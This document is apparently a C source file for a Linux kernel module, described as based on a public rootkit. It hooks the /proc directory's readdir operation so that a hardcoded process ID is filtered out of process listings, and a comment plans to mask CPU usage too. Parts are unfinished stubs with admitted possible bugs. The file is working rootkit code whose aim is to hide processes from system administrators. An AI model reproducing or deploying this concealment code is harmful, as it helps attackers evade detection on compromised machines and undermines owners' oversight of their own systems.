// Based heavily on https://github.com/mfontanini/Programs-Scripts/blob/master/rootkit/rootkit.c

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/namei.h>
#include <linux/sched.h>
#include <linux/proc_fs.h>
#include <linux/version.h>

#include "processHider.h"
/*
Related things to manipulate to prevent rootkit being visable:
 * average cpu usage
*/

static int do_readdir_proc (struct file *fp, void *buf, filldir_t fdir);

/* Injection structs */
struct inode *pinode, *tinode, *uinode, *rcinode, *modinode;
struct proc_dir_entry *modules, *root, *handler, *tcp;
static struct file_operations proc_fops;
const struct file_operations *originalProc = 0, *modules_originalProc = 0, *tcp_originalProc = 0;

filldir_t proc_filldir = NULL;

unsigned hidden_pid_count = 0;
void hook_proc(struct proc_dir_entry *root);


int processHider_init(void) {
	
	static struct file_operations fileops_struct = {0};
	struct proc_dir_entry *new_proc;
	// dummy to get proc_dir_entry of /proc_create
	new_proc = proc_create("dummy", 0644, 0, &fileops_struct);
	root = new_proc->parent;
	hook_proc(root);
	
	remove_proc_entry("dummy", 0);
	
	return 0;
}

//TODO: add / info on what to hide
void hideProcess(void) {
	// from base.c 	//struct mm_struct *mm = get_task_mm(task); 
}



void hook_proc(struct proc_dir_entry *root) {
	// search for /proc's inode
#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
	struct nameidata inode_data;
	if(path_lookup("/proc/", 0, &inode_data))
		return;
#else
	struct path p;
	if(kern_path("/proc/", 0, &p))
		return;
	pinode = p.dentry->d_inode;
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 33)
	pinode = inode_data.path.dentry->d_inode;
#elif LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
	pinode = inode_data.inode;
#endif

	if (pinode == NULL) {
		return;
	}
	
	// hook /proc readdir
	proc_fops = *pinode->i_fop;
	originalProc = pinode->i_fop;
	proc_fops.readdir = do_readdir_proc;
	pinode->i_fop = &proc_fops;
}



int fake_proc_fill_dir(void *a, const char *buffer, int c, loff_t d, u64 e, unsigned f) {
	char *tohidePID = "2668"; //TODO: make it possible to specify the pid to hide in an easier way...
	
	//printk(KERN_INFO "proc entry: %s\n", buffer);
	int doStringsMatch = (strcmp(buffer, tohidePID) == 0);
	
	int result;
	if (doStringsMatch) {
		result = 0;
	} else {
		result = proc_filldir(a, buffer, c, d, e, f); /// this may be null... / there may be issues if accessed concurrently... :(....
		//sproc_filldir = NULL; //TODO: PERHAPS REMOVE THIS _ IT MAY BE WRONG>.
	}
	return result;
}


static int do_readdir_proc (struct file *fp, void *buf, filldir_t fdir) {
	proc_filldir = fdir;
	
	int result = originalProc->readdir(fp, buf, fake_proc_fill_dir);
	return result;
}
void processHider_exit(void) {
	if (originalProc != NULL) {
		if (pinode != NULL) {
			pinode->i_fop = originalProc;
		}
	}
}


